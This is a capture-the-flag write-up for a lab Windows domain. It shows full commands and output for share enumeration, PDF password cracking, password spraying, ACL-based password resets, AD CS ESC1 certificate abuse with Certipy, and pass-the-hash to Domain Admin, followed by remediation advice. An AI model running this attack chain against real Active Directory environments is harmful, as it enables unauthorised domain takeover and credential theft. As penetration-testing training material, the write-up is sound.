`[ACTIVE DIRECTORY]` `[PASSWORD CRACKING]` `[PASSWORD SPRAYING]` `[GENERICALL]` `[FORCECHANGEPASSWORD]` `[ADCS ESC1]` `[PASS-THE-HASH]`

---

![](<../.gitbook/assets/welcome_cover.png>)

**Machine Write-Up**

---

**Platform:** Hack Smarter Labs   
**Difficulty:** Easy   
**Operating System:** Windows Server 2022 Build 20348   

---

## Scenario

### Objective / Scope

You are a member of the Hack Smarter Red Team. During a phishing engagement, you were able to retrieve credentials for the client's Active Directory environment. Use these credentials to enumerate the environment, elevate your privileges, and demonstrate impact for the client.

### Starting Credentials

```
e.hills:Il0vemyj0b2025!
```

---

<details>
<summary>Summary</summary>

We begin an assumed-breach assessment holding domain credentials for `e.hills`. Service enumeration identifies a single host — `DC01.WELCOME.local` — exposing the full Active Directory port profile and, importantly, an Active Directory Certificate Services CA (`WELCOME-CA`). SMB enumeration reveals a non-standard `Human Resources` share with READ access, from which we pull five onboarding PDFs. One, `Welcome Start Guide.pdf`, is password protected; we extract its hash with `pdf2john` and crack it with `john`. The decrypted document discloses the default password issued to every new employee during account setup. After confirming the domain has no account-lockout threshold, we spray that default password across all enumerated domain users and land on `a.harris`, who belongs to `Remote Management Users` — granting an Evil-WinRM shell and the first flag. BloodHound shows `a.harris` holds `GenericAll` over `i.park`, so we reset `i.park`'s password with `bloodyAD`. `i.park`, by virtue of `Helpdesk` membership, holds `ForceChangePassword` over the CA service account `svc_ca`, which we likewise reset. With `svc_ca` we enumerate AD CS using Certipy and discover `Welcome-Template` is vulnerable to **ESC1** — it permits an enrollee-supplied subject and allows client authentication. We request a certificate impersonating `Administrator`, authenticate with it to recover the `Administrator` NT hash, and pass-the-hash into an Evil-WinRM shell for full domain compromise and the root flag.

</details>

---

## Recon

### Nmap

With credentials already in hand, this is an assumed-breach test — we still begin by profiling the target's exposed services.

```bash
nmap -sC -sV -Pn <DC_IP>
```

```
# Console Output
PORT      STATE    SERVICE       VERSION
53/tcp    filtered domain
88/tcp    open     kerberos-sec  Microsoft Windows Kerberos (server time: 2026-06-23 20:06:50Z)
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   filtered netbios-ssn
389/tcp   filtered ldap
445/tcp   open     microsoft-ds?
464/tcp   filtered kpasswd5
593/tcp   open     tcpwrapped
636/tcp   open     ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: WELCOME.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.WELCOME.local
| Issuer: commonName=WELCOME-CA/domainComponent=WELCOME
3268/tcp  open     tcpwrapped
3269/tcp  open     tcpwrapped
3389/tcp  open     ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: WELCOME
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: WELCOME.local
|   DNS_Computer_Name: DC01.WELCOME.local
|_  Product_Version: 10.0.20348
```

The port profile is textbook domain controller: Kerberos (88), LDAP/LDAPS (389/636), Global Catalog (3268/3269), and RDP (3389). Two details shape the rest of the engagement:

- **Domain:** `WELCOME.local`, with the DC identified as `DC01.WELCOME.local`.
- **Active Directory Certificate Services is present.** The LDAPS certificate is issued by `commonName=WELCOME-CA` — an enterprise CA on the network. AD CS is a frequent source of domain-wide escalation paths, so we note it as a priority target for later.

### SMB — Share Enumeration

Using the phished credentials, we enumerate shares with NetExec. Beyond the default administrative and SYSVOL/NETLOGON shares, a non-standard `Human Resources` share is readable:

```bash
nxc smb welcome.local -u 'e.hills' -p 'Il0vemyj0b2025!' --shares
```

```
# Console Output
SMB    <DC_IP>    445    DC01    [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:WELCOME.local) (signing:True) (SMBv1:None)
SMB    <DC_IP>    445    DC01    [+] WELCOME.local\e.hills:<PASSWORD REDACTED>
SMB    <DC_IP>    445    DC01    [*] Enumerated shares
SMB    <DC_IP>    445    DC01    Share           Permissions     Remark
SMB    <DC_IP>    445    DC01    -----           -----------     ------
SMB    <DC_IP>    445    DC01    ADMIN$                          Remote Admin
SMB    <DC_IP>    445    DC01    C$                              Default share
SMB    <DC_IP>    445    DC01    Human Resources READ
SMB    <DC_IP>    445    DC01    IPC$            READ            Remote IPC
SMB    <DC_IP>    445    DC01    NETLOGON        READ            Logon server share
SMB    <DC_IP>    445    DC01    SYSVOL          READ            Logon server share
```

We connect to the `Human Resources` share with `smbclient` and list its contents — five HR onboarding documents:

```bash
smbclient //<DC_IP>/"Human Resources" -U 'e.hills'
```

```
# Console Output
smb: \> dir
  .                                   D        0  Sat Sep 13 19:20:17 2025
  ..                                  D        0  Sat Sep 13 16:11:19 2025
  Welcome 2025 Holiday Schedule.pdf   A    84715  Sat Sep 13 18:18:12 2025
  Welcome Benefits.pdf                A    81466  Sat Sep 13 18:18:12 2025
  Welcome Handbook Excerpts.pdf       A    82644  Sat Sep 13 18:18:12 2025
  Welcome Performance Review Guide.pdf A   79823  Sat Sep 13 18:18:12 2025
  Welcome Start Guide.pdf             A    89511  Sat Sep 13 18:18:12 2025
```

---

## Foothold

### Cracking the Protected PDF

We download all five PDFs and review each. Four open freely, but `Welcome Start Guide.pdf` is password protected:

![Welcome Start Guide.pdf prompts for a password on open](<../.gitbook/assets/welcome_pdf_password_protected.png>)

A PDF's user/owner password is stored as a key-derivation hash inside the document, which means it is crackable offline. We extract that hash with `pdf2john` and feed it to `john` against `rockyou.txt`:

```bash
pdf2john 'Welcome Start Guide.pdf' > pdf.hash
```

```bash
john pdf.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

```
# Console Output
Using default input encoding: UTF-8
Loaded 1 password hash (PDF [MD5 SHA2 RC4/AES 32/64])
Cost 1 (revision) is 4 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
<PASSWORD REDACTED>   (Welcome Start Guide.pdf)
1g 0:00:00:03 DONE (2026-06-23 16:35) 0.2785g/s 258638p/s 258638c/s 258638C/s
Session completed.
```

The document password falls in seconds. Opening the guide reveals the payload that breaks the engagement wide open: the onboarding procedure documents the **default password** assigned to every new user account during setup.

![Onboarding guide discloses the default account-setup password](<../.gitbook/assets/welcome_pdf_default_password.png>)

> **Why this matters:** A documented default password is only safe if every user is forced to change it at first logon and that policy is actually enforced. Any account still sitting on the default becomes a free credential — exactly the weakness we exploit next.

### Enumerating Domain Users

Before spraying, we need the full list of accounts to test. NetExec pulls domain users over SMB:

```bash
nxc smb welcome.local -u 'e.hills' -p 'Il0vemyj0b2025!' --users
```

```
# Console Output
SMB    <DC_IP>    445    DC01    -Username-      -Last PW Set-        -BadPW- -Description-
SMB    <DC_IP>    445    DC01    Administrator   2025-09-13 16:24:04  0       Built-in account for administering the computer/domain
SMB    <DC_IP>    445    DC01    Guest           <never>              0       Built-in account for guest access
SMB    <DC_IP>    445    DC01    krbtgt          2025-09-13 16:40:39  0       Key Distribution Center Service Account
SMB    <DC_IP>    445    DC01    e.hills         2025-09-13 20:41:15  0
SMB    <DC_IP>    445    DC01    j.crickets      2025-09-13 20:43:53  0
SMB    <DC_IP>    445    DC01    e.blanch        2025-09-13 20:49:13  0
SMB    <DC_IP>    445    DC01    i.park          2025-09-14 04:23:03  0       IT Intern
SMB    <DC_IP>    445    DC01    j.johnson       2025-09-13 20:58:15  0
SMB    <DC_IP>    445    DC01    a.harris        2025-09-13 20:59:13  0
SMB    <DC_IP>    445    DC01    svc_ca          2025-09-14 00:19:35  0
SMB    <DC_IP>    445    DC01    svc_web         2025-09-13 21:40:40  0       Web Server in Progress
```

We strip the three built-in accounts (`Administrator`, `Guest`, `krbtgt`) and save the remaining eight users to `loot/users.txt` for the spray.

### Password Spraying the Default Credential

A password spray tests one password against many accounts — the inverse of a brute force — which keeps the bad-password count per account low. Even so, the responsible first step is to confirm the domain's lockout policy so we don't disable any accounts:

```bash
nxc smb welcome.local -u 'e.hills' -p 'Il0vemyj0b2025!' --pass-pol
```

```
# Console Output
Account Lockout Threshold: None
```

With no lockout threshold set, we can safely test the default password against every user. We spray with `--continue-on-success` so the run completes against all accounts:

```bash
nxc smb welcome.local -u loot/users.txt -p '<PASSWORD REDACTED>' --continue-on-success
```

```
# Console Output
SMB    <DC_IP>    445    DC01    [-] WELCOME.local\e.hills:<PASSWORD REDACTED> STATUS_LOGON_FAILURE
SMB    <DC_IP>    445    DC01    [-] WELCOME.local\j.crickets:<PASSWORD REDACTED> STATUS_LOGON_FAILURE
SMB    <DC_IP>    445    DC01    [-] WELCOME.local\e.blanch:<PASSWORD REDACTED> STATUS_LOGON_FAILURE
SMB    <DC_IP>    445    DC01    [-] WELCOME.local\i.park:<PASSWORD REDACTED> STATUS_LOGON_FAILURE
SMB    <DC_IP>    445    DC01    [-] WELCOME.local\j.johnson:<PASSWORD REDACTED> STATUS_LOGON_FAILURE
SMB    <DC_IP>    445    DC01    [+] WELCOME.local\a.harris:<PASSWORD REDACTED>
SMB    <DC_IP>    445    DC01    [-] WELCOME.local\svc_ca:<PASSWORD REDACTED> STATUS_LOGON_FAILURE
SMB    <DC_IP>    445    DC01    [-] WELCOME.local\svc_web:<PASSWORD REDACTED> STATUS_LOGON_FAILURE
```

`a.harris` never rotated the onboarding default — the spray confirms valid credentials.

### Evil-WinRM as `a.harris` — User Flag

NetExec flags `a.harris` as a member of `Remote Management Users`, the group that grants access to the WinRM (PowerShell Remoting) endpoint. That means we can open an interactive shell with Evil-WinRM.

![BloodHound — a.harris is a member of Remote Management Users](<../.gitbook/assets/welcome_bloodhound_remote_mgmt_users.png>)

```bash
evil-winrm -i <DC_IP> -u a.harris -p '<PASSWORD REDACTED>'
```

The first flag sits on the `a.harris` desktop:

![User flag retrieved from the a.harris desktop](<../.gitbook/assets/welcome_user_flag.png>)

---

## Lateral Movement

With a foothold established, we collect BloodHound data and analyse the access-control relationships radiating from `a.harris`.

### `GenericAll` over `i.park`

BloodHound shows `a.harris` holds **`GenericAll`** on the user object `i.park`. `GenericAll` is full control over the target object — critically, it includes the right to reset the target's password **without knowing the current one**.

![BloodHound — a.harris has GenericAll over i.park](<../.gitbook/assets/welcome_genericall_ipark.png>)

We abuse it with `bloodyAD` to set a password we control:

```bash
bloodyAD -d welcome.local -u a.harris -p '<PASSWORD REDACTED>' -H <DC_IP> set password i.park '<PASSWORD REDACTED>'
```

```
# Console Output
[+] Password changed successfully!
```

Verifying the new credentials authenticate:

```bash
nxc smb welcome.local -u i.park -p '<PASSWORD REDACTED>'
```

```
# Console Output
SMB    <DC_IP>    445    DC01    [+] WELCOME.local\i.park:<PASSWORD REDACTED>
```

### `ForceChangePassword` over `svc_ca`

`i.park` is an `IT Intern` and a member of the **`Helpdesk`** group. Through that membership, `i.park` inherits **`ForceChangePassword`** over two service accounts — including `svc_ca`, the **Certificate Authority service account**. `ForceChangePassword` is the narrower cousin of `GenericAll`: it grants exactly the password-reset right and nothing more, which is all we need.

![BloodHound — i.park, via Helpdesk, can ForceChangePassword on the service accounts](<../.gitbook/assets/welcome_helpdesk_forcechange.png>)

![BloodHound — Helpdesk path to the svc_ca account](<../.gitbook/assets/welcome_svc_ca_enroll.png>)

Reaching `svc_ca` is the breakthrough: it is the account tied to AD CS, the certificate service we flagged during recon. We reset its password with `bloodyAD` as `i.park`:

```bash
bloodyAD -d welcome.local -u i.park -p '<PASSWORD REDACTED>' -H <DC_IP> set password svc_ca '<PASSWORD REDACTED>'
```

```
# Console Output
[+] Password changed successfully!
```

```bash
nxc smb welcome.local -u svc_ca -p '<PASSWORD REDACTED>'
```

```
# Console Output
SMB    <DC_IP>    445    DC01    [+] WELCOME.local\svc_ca:<PASSWORD REDACTED>
```

We now control the CA service account and can enumerate AD CS directly.

---

## Privilege Escalation

The full chain to Domain Admin is now in view:

> `i.park` → **ForceChangePassword** → `svc_ca` → **Enroll** → `Welcome-Template` (if vulnerable) → **Certificate** → authenticate as `Administrator`

![BloodHound — the ESC1 attack path from svc_ca to domain compromise](<../.gitbook/assets/welcome_esc1_attack_path.png>)

### Enumerating AD CS — Discovering ESC1

We run Certipy's `find` to enumerate enabled and vulnerable certificate templates as `svc_ca`:

```bash
certipy find -u 'svc_ca@welcome.local' -p '<PASSWORD REDACTED>' -dc-ip '<DC_IP>' -text -enabled -hide-admins -vulnerable
```

```
# Console Output
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Retrieving CA configuration for 'WELCOME-CA' via RRP
[*] Successfully retrieved CA configuration for 'WELCOME-CA'
[*] Saving text output to '20260624034431_Certipy.txt'
```

The text report flags a custom template, `Welcome-Template`, as vulnerable:

```
# Console Output
    Template Name                       : Welcome-Template
    Certificate Authorities             : WELCOME-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Server Authentication
                                          Client Authentication
    Requires Manager Approval           : False
    Authorized Signatures Required      : 0
    Permissions
      Enrollment Permissions
        Enrollment Rights               : WELCOME.LOCAL\svc ca
    [+] User Enrollable Principals      : WELCOME.LOCAL\svc ca
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
```

This is a classic **ESC1** configuration, and all three preconditions are met:

1. **Enrollee Supplies Subject** — the requester chooses the certificate's subject, including the `userPrincipalName`. We can therefore request a certificate *as* any user we name.
2. **Client Authentication EKU** — the issued certificate is valid for authenticating to Active Directory (PKINIT / Schannel).
3. **`svc_ca` has enrollment rights** and manager approval is not required — we can enroll unattended.

Combined, these let the holder of `svc_ca` mint a client-authentication certificate for `Administrator` and log in as them.

### Exploiting ESC1

**Step 1 — Recover the target SID.** Certipy embeds the impersonated user's SID into the certificate request, so we first read the `Administrator` object's SID:

```bash
certipy account -u svc_ca -p '<PASSWORD REDACTED>' -dc-ip <DC_IP> -user 'Administrator' read
```

```
# Console Output
[*] Reading attributes for 'Administrator':
    objectSid                           : S-1-5-21-141921413-1529318470-1830575104-500
```

**Step 2 — Request the certificate as `Administrator`.** Because the template lets the enrollee supply the subject, we pass `-upn Administrator` and the SID from the previous step:

```bash
certipy req -u 'svc_ca' -p '<PASSWORD REDACTED>' -dc-ip '<DC_IP>' -target 'DC01.WELCOME.LOCAL' -ca 'WELCOME-CA' -template 'Welcome-Template' -upn 'Administrator' -sid 'S-1-5-21-141921413-1529318470-1830575104-500'
```

```
# Console Output
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 21
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator'
[*] Certificate object SID is 'S-1-5-21-141921413-1529318470-1830575104-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

**Step 3 — Authenticate with the certificate.** Certipy uses the PFX to obtain a Kerberos TGT for `Administrator` via PKINIT, then leverages the UnPAC-the-hash technique to recover the account's NT hash:

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '<DC_IP>' -domain 'welcome.local'
```

```
# Console Output
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator'
[*]     SAN URL SID: 'S-1-5-21-141921413-1529318470-1830575104-500'
[*] Using principal: 'administrator@welcome.local'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@welcome.local': aad3b435b51404eeaad3b435b51404ee:<HASH REDACTED>
```

### Root Flag — Pass-the-Hash as `Administrator`

With the `Administrator` NT hash, we pass-the-hash into an Evil-WinRM shell — no cleartext password required:

```bash
evil-winrm -i <DC_IP> -u Administrator -H '<HASH REDACTED>'
```

```
# Console Output
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
welcome\administrator
```

The domain is fully compromised, and the root flag is retrieved from the `Administrator` desktop:

![Domain compromised — root flag retrieved as welcome\administrator](<../.gitbook/assets/welcome_root_flag.png>)

---

## Remediation

- **Default onboarding password:** Never document a static, shared default password. Issue unique, randomly generated initial passwords per user and enforce "User must change password at next logon" so the default cannot be sprayed.
- **Sensitive data on open shares:** The `Human Resources` share exposed onboarding documents — including credentials — to any authenticated user. Restrict share and NTFS permissions to the HR group only, and remove credential material from documents entirely.
- **Weak document protection:** The protected PDF used a password crackable from `rockyou.txt` in seconds. Document encryption is not a substitute for access control; remove secrets from documents rather than relying on a passphrase.
- **No account-lockout policy:** With the lockout threshold set to `None`, password spraying carried zero risk of detection or disruption. Configure a sane lockout threshold and observation window, and alert on bursts of failed logons across multiple accounts.
- **Excessive ACLs (`GenericAll` / `ForceChangePassword`):** Helpdesk and ordinary users held password-reset rights over other users and a service account. Audit AD object ACLs with BloodHound, remove unnecessary delegations, and place service accounts in protected OUs with tightly scoped administration.
- **AD CS ESC1:** Reconfigure `Welcome-Template` to disable "Enrollee Supplies Subject" (`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`), require manager approval, and restrict enrollment rights to only the principals that genuinely need them. Enable the strong certificate-mapping enforcement introduced by the May 2022 patches (KB5014754).

---

## References

1. [Certipy Wiki — 05 ‐ Usage](https://github.com/ly4k/Certipy/wiki/05-%E2%80%90-Usage)
2. [Certipy Wiki — 06 ‐ Privilege Escalation (ESC1)](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc1-enrollee-supplied-subject-for-client-authentication)
